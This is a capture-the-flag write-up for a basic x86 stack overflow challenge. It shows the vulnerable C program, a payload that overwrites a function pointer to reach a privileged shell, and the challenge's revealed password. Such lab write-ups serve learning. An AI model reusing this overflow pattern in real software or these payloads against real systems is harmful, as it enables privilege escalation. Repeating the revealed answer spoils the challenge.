# ELF x86 - Stack buffer overflow basic 2

Another basic stack overflow - overwrite a function pointer, no protections

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}

void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}

void main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```

| ========== MEMORY ==========                        |
| --------------------------------------------------- |
| void (*func)()                                \[4\] |
| char buf\[128\];                           \[128\]  |

```bash
app-systeme-ch15@challenge02:~$ objdump -d ch15 | grep shell
08048516 <shell>:
```

POC
```bash
app-systeme-ch15@challenge02:~$ (python -c "print('A' * 128 + 'BBBB')" ; cat ) | ./ch15
Segmentation fault
```

FINAL
```bash
app-systeme-ch15@challenge02:~$ (python -c "print('A' * 128 + '\x16\x85\x04\x08')" ; cat ) | ./ch15
whoami
app-systeme-ch15-cracked
cat .passwd
B33r1sSoG0oD4y0urBr4iN
```
